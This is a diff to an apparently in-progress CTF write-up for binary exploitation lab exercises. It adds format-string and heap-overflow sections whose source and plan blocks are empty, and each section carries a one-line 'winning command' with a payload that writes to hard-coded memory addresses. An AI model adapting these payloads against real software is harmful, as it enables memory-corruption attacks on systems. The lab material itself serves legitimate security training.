@@ -13,6 +13,12 @@ NOTE: write ups in progress. Adding python exploit poc's to each excercise for p
 |[Stack2](#stack2)|
 |[Stack3](#stack3)|
 |[Stack4](#stack4)|
+|[Format0](#format0)|
+|[Format1](#format1)|
+|[Format2](#format2)|
+|[Heap0](#Heap0)|
+|[Heap1](#Heap1)|
+
 
 
 
@@ -370,4 +376,80 @@ print(input)
 
 cproc = Popen(["./stack4"], stdin=PIPE, stdout=PIPE)
 print cproc.communicate(input)
+```
+
+
+
+##Format0
+---------------------------------------
+###Source Code:
+```C
+
+```
+
+###Plan:
+
+
+###winning command:
+```bash
+./format0 $(python -c "print '%64d'+'\xef\xbe\xad\xde'")
+```
+###Python exploit:
+```Python
+```
+
+##Format1
+---------------------------------------
+###Source Code:
+```C
+
+```
+
+###Plan:
+
+
+###winning command:
+```bash
+./format1 $(python -c 'print "\x38\x96\x04\x08"+"aaaaaaaaaa"+"%127$n"')
+```
+###Python exploit:
+```Python
+```
+
+
+##Format2
+---------------------------------------
+###Source Code:
+```C
+
+```
+
+###Plan:
+
+
+###winning command:
+```bash
+python -c 'print "\xe4\x96\x04\x08"+"%59x."+"%4$n"' | ./format2
+```
+###Python exploit:
+```Python
+```
+
+
+##Heap1
+---------------------------------------
+###Source Code:
+```C
+
+```
+
+###Plan:
+
+
+###winning command:
+```bash
+./heap1 $(python -c "print 'a'*20+'\x2c\xd6\xff\xff'") $(python -c "print '\x94\x84\x04\x08'") 
+```
+###Python exploit:
+```Python
 ```
